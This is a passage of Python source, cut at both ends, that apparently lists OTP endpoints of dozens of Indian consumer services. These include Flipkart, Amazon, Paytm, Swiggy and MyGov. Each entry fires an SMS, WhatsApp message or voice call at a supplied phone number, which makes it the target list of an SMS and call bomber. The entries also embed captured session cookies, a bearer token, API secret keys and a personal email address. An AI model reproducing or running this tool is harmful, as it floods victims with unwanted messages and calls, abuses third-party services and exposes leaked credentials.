                "Cookie": "X-Magento-Vary=7253ab9fc388bf858e88f6c5b3ad9d20efd0c2afa76c88022c82f5b7e12d8dd8; PHPSESSID=0bf7f5d8d3af44bc50aeda7b8b51fa8b; _gcl_au=1.1.1097443806.1745238499; _ga_3YTXH403VL=GS1.1.1745238499.1.0.1745238499.60.0.1102057604; _ga=GA1.1.192685670.1745238500; _fbp=fb.1.1745238506999.831971844971570496; fastrr_uuid=1b20f947-fed8-49e5-a719-e9ffad876e6d; fastrr_usid=1b20f947-fed8-49e5-a719-e9ffad876e6d-1745238507912; sociallogin_referer_store=https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1; form_key=YJhK7hwSLfPsrlIo; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; cf_clearance=j19CDG8K1gn1L1h7_4VZCKUooUZtTYpxeBUC2Lux3Zo-1745238510-1.2.1.1-Cqvbh_RiIRgsCZKrpq.nnB.sx3LbLUw3MdbYfWzupniUjlhOYxqxVZSfwZfdm39IFuJrct6OeXj60cIyZotm9G1qptUBqCEHw_A5XjlhmtZ5_52EG9n0r0q9rhTZ.qT6ao7jj8k4RANRvHshdV47fXpz7BmvvvHl856x.tnP32auJyOBAP0KAw9SyZSXAC3XhR2CWs._08I21k90gtw3Qv8tjjlbqQjQNV9_ctDV6j2J_kh4xzhzQQQ2LrbuxtHjF_AjllteBD7a4BwuGq9roN0N48thQC3_meeP8irRIXLN7ndRE4vnvQJgrVN9iE9DxDhphhKGRt4xiZthB9XpZvWgH1u62Q5otw9kyTp75bs; section_data_ids={%22merge-quote%22:1745238511%2C%22cart%22:1745238512%2C%22custom_section%22:1745238513}; private_content_version=1c35968280f95365b50e1c62ebfbdb01"
            },
            "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
        },
        {
            "name": "ShipRocket SMS",
            "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "headers": {
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"mobileNumber":"{p}"}}'
        },
        {
            "name": "GoKwik SMS",
            "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "gk-version": "20250421065835697",
                "gk-timestamp": "58174641",
                "sec-ch-ua-platform": "Android",
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "gk-signature": "076108",
                "gk-udf-1": "951",
                "sec-ch-ua-mobile": "?1",
                "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
                "gk-merchant-id": "19g6jlc658iad",
                "origin": "https://pdp.gokwik.co",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://pdp.gokwik.co/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
        },
        {
            "name": "Jockey SMS",
            "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
            "method": "GET",
            "headers": {
                "Host": "www.jockey.in",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
                "Accept": "*/*",
                "Referer": "https://www.jockey.in/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
            },
            "data": None
        },
        {
            "name": "Jockey WhatsApp",
            "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
            "method": "GET",
            "headers": {
                "Host": "www.jockey.in",
                "Accept": "*/*",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.jockey.in/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "Cookie": "secure_customer_sig=; localization=IN; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INMP%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22p%22%3Atrue%2C%22a%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%220076A26B-593e-4179-adb7-7df1a1acfdaa%22%7D; _shopify_y=43a0be93-7c1c-4f33-bfad-c1477bb4a5c4; wishlist_id=7531056362767gn1bc6na3; bookmarkeditems={\"items\":[]}; wishlist_customer_id=0; _orig_referrer=; _landing_page=%2F%3Fsrsltid%3DAfmBOopQUXJnULldDNJDov4FZosiMLiJWWydft0OHn_M2nopq0YOyBr7; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpHWUhOUkZWS0RNWFlQRTY0S1dFWTA1Sw%3Fkey%3D38a52d30f4363b9ee4e8ffea783532bb; keep_alive=c4db46b0-bfba-48e7-878e-f6e81085a234; cart_ts=1736192207; cart_sig=04c8cecd093ed714d4a4dd68dfcc4020; cart_currency=INR; _shopify_s=83810dbb-190b-45ae-bb0a-de2fbf1090ed; _shopify_sa_t=2025-01-06T19%3A36%3A47.278Z"
            },
            "data": None
        },
        {
            "name": "NewMe SMS",
            "url": "https://prodapi.newme.asia/web/otp/request",
            "method": "POST",
            "headers": {
                "Host": "prodapi.newme.asia",
                "Content-Length": lambda d: str(len(d)),
                "Timestamp": lambda: str(int(time.time() * 1000)),
                "Delivery-Pincode": "",
                "Caller": "web_app",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Origin": "https://newme.asia",
                "Referer": "https://newme.asia/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
            },
            "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
        },
        {
            "name": "Univest SMS",
            "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
            "method": "GET",
            "headers": {
                "Host": "api.univest.in",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": None
        },
        {
            "name": "Rappi WhatsApp V2",
            "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
        },
        {
            "name": "Foxy SMS",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Platform": "web",
                "Origin": "https://www.foxy.in",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.foxy.in/onboarding",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
        },
        {
            "name": "Foxy WhatsApp",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Platform": "web",
                "Origin": "https://www.foxy.in",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.foxy.in/onboarding",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
        },
        {
            "name": "Eka Care WhatsApp",
            "url": "https://auth.eka.care/auth/init",
            "method": "POST",
            "headers": {
                "Device-Id": "5df83c463f0ff8ff",
                "Flavour": "android",
                "Locale": "en",
                "Version": "1382",
                "Client-Id": "androidp",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "okhttp/4.9.3"
            },
            "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
        },
        {
            "name": "Smytten SMS",
            "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
            "method": "POST",
            "headers": {
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://smytten.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://smytten.com/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "Desktop-Request": "false",
                "Web-Version": "1",
                "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
                "Request-Type": "web",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
            },
            "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{p}","email":"sdhabai09@gmail.com"}}'
        },
        {
            "name": "Wakefit SMS",
            "url": "https://api.wakefit.co/api/consumer-sms-otp/",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.wakefit.co",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.wakefit.co/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": '"Android"',
                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "API-Secret-Key": "ycq55IbIjkLb",
                "API-Token": "c84d563b77441d784dce71323f69eb42",
                "My-Cookie": "undefined"
            },
            "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
        },
        {
            "name": "CaratLane SMS",
            "url": "https://www.caratlane.com/cg/dhevudu",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Origin": "https://www.caratlane.com",
                "Referer": "https://www.caratlane.com/register",
                "Accept-Encoding": "gzip, deflate, br",
                "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
                "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
            },
            "data": lambda p: f'{{"query":"\\n        mutation {{\\n            SendOtp( \\n                input: {{\\n        mobile: \\"{p}\\",\\n        isdCode: \\"91\\",\\n        otpType: \\"registerOtp\\"\\n      }}\\n            ) {{\\n                status {{\\n                    message\\n                    code\\n                }}\\n            }}\\n        }}\\n    "}}'
        },
        {
            "name": "Tata Capital Voice Call",
            "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
        },
        {
            "name": "1MG Voice Call",
            "url": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'
        },
        {
            "name": "Swiggy Call Verification",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Myntra Voice Call",
            "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Flipkart Voice Call",
            "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Amazon Voice Call",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&action=voice_otp"
        },
        {
            "name": "Paytm Voice Call",
            "url": "https://accounts.paytm.com/signin/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Zomato Voice Call",
            "url": "https://www.zomato.com/php/o2_api_handler.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"phone={p}&type=voice"
        },
        {
            "name": "MakeMyTrip Voice Call",
            "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Goibibo Voice Call",
            "url": "https://www.goibibo.com/user/voice-otp/generate/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Ola Voice Call",
            "url": "https://api.olacabs.com/v1/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Uber Voice Call",
            "url": "https://auth.uber.com/v2/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "PharmEasy SMS",
            "url": "https://pharmeasy.in/api/v2/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Byjus SMS",
            "url": "https://api.byjus.com/v2/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Doubtnut SMS",
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "headers": {"content-type": "application/json; charset=utf-8"},
            "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'
        }
    ]

    # ==================================================================
    # SECTION 2: MORE APIS
    # ==================================================================
    more_apis = [
        {
            "name": "MyHubble Money",
            "url": "https://api.myhubble.money/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'
        },
        {
            "name": "Snapmint SMS",
            "url": "https://api.snapmint.com/v1/public/sign_up",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Housing SMS",
            "url": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'
        },
        {
            "name": "RentoMojo SMS",
            "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Khatabook SMS",
            "url": "https://api.khatabook.com/v1/auth/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'
        },
        {
            "name": "Netmeds SMS",
            "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Nykaa SMS",
            "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"
        },
        {
            "name": "RummyCircle SMS",
            "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'
        },
        {
            "name": "Animall SMS",
            "url": "https://animall.in/zap/auth/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'
        },
        {
            "name": "Entri SMS",
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Cosmofeed SMS",
            "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'
        },
        {
            "name": "Aakash SMS",
            "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'
        },
        {
            "name": "Revv SMS",
            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'
        },
        {
            "name": "DeHaat SMS",
            "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'
        },
        {
            "name": "A23 Games SMS",
            "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
        },
        {
            "name": "Spencers SMS",
            "url": "https://jiffy.spencers.in/user/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "ShopperStop SMS",
            "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
        },
        {
            "name": "Lifestyle Stores SMS",
            "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'
        },
        {
            "name": "PokerBaazi SMS",
            "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'
        },
        {
            "name": "My11Circle SMS",
            "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "MamaEarth SMS",
            "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "HomeTriangle SMS",
            "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Wellness Forever SMS",
            "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"
        },
        {
            "name": "HealthMug SMS",
            "url": "https://api.healthmug.com/account/createotp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Kredily SMS",
            "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Tata Motors SMS",
            "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'
        },
        {
            "name": "Moglix SMS",
            "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'
        },
        {
            "name": "MyGov SMS",
            "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "TrulyMadly SMS",
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'
        },
        {
            "name": "Apna SMS",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'
        },
        {
            "name": "CodFirm SMS",
            "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Swipe SMS",
            "url": "https://app.getswipe.in/api/user/mobile_login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","resend":true}}'
        },
        {
            "name": "More Retail SMS",
            "url": "https://omni-api.moreretail.in/api/v1/login/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'
        },
        {
            "name": "Country Delight SMS",
            "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'
        },
        {
            "name": "AstroSage SMS",
            "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Rapido SMS",
            "url": "https://customer.rapido.bike/api/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "TooToo SMS",
            "url": "https://tootoo.in/graphql",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'
        },
        {
            "name": "ConfirmTkt SMS",
            "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "BetterHalf SMS",
            "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'
        },
        {
            "name": "Charzer SMS",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'
        },
        {
            "name": "Nuvama Wealth SMS",
            "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'
        },
        {
            "name": "Mpokket SMS",
            "url": "https://web-api.mpokket.in/registration/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}"}}'
        },
        {
            "name": "Meesho OTP",
            "url": "https://www.meesho.com/api/v1/user/login/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"{p}"}}'
        },
        {
            "name": "PhonePe OTP",
            "url": "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"rmn":"{p}","purpose":"REGISTRATION"}}'
        },
        {
            "name": "JustDial OTP",
            "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"mobile={p}"
        },
        {
            "name": "Allen Solly OTP",
